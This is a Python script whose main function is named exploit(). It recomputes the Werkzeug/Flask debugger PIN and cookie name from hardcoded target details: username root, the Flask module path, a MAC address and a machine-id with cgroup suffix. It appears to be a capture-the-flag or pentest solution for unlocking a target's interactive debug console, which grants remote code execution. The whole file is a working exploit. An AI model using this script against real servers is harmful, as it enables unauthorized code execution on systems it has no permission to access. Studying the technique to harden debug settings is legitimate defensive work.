import uuid
import hashlib
from itertools import chain

username = 'root'
modname = 'flask.app'
app_name = 'Flask'
mod_file = '/usr/local/lib/python3.10/site-packages/flask/app.py'
machine_id = b'2558de33-09d9-416e-8696-f906c328c285c87d54a1b69663abce7107a30eb66059e7314d973e943463abd3f71dcf61a3df'
mac_addr = '2485377892355'


num = None
rv = None


def exploit():
    global num
    global rv

    probably_public_bits = [
        username,
        modname,
        app_name,  # getattr(app, "__name__", type(app).__name__),
        mod_file,  # getattr(mod, "__file__", None),
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = [
        mac_addr,  # str(uuid.getnode()),
        get_machine_id()
    ]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x: x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    print(rv)

    return rv, cookie_name


def get_machine_id():
    if machine_id:
        return machine_id

    linux = b""

    # machine-id is stable across boots, boot_id is not.
    for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
        try:
            with open(filename, "rb") as f:
                value = f.readline().strip()
        except OSError:
            continue

        if value:
            linux += value
            break

    # Containers share the same machine id, add some cgroup
    # information. This is used outside containers too but should be
    # relatively stable across boots.
    try:
        with open("/proc/self/cgroup", "rb") as f:
            linux += f.readline().strip().rpartition(b"/")[2]
    except OSError:
        pass

    if linux:
        return linux


if __name__ == '__main__':
    exploit()
